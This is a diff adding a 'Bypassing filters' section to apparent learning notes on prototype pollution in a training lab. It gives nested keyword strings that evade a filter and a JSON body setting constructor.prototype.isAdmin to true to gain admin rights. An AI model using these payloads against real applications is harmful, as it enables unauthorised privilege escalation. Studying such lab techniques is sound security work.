@@ -596,6 +596,39 @@ If it does, the header being processed is effectively dropped. Due to the way th
 }
 ```
 
+----------------
 
+### Bypassing filters
 
 -----------------
+
+- Replacing filter common bypass-:
+
+```
+__pro__proto__to__
+consconstructortructor.proprototypetotype
+```
+
+- Lab bypass with `constructor.prototype`
+
+```json
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Wienerville",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "aXi5nNBtlbVU0fVoKld6V7B4lVfH0jpO",
+  "constructor": {
+    "prototype": {
+      "isAdmin": true
+    }
+  }
+}
+```
+- Proof-:
+
+<img width="1501" height="749" alt="image" src="https://github.com/user-attachments/assets/a759ea1c-ef7d-4552-94c7-248ecad92438" />
+
+
+----------------
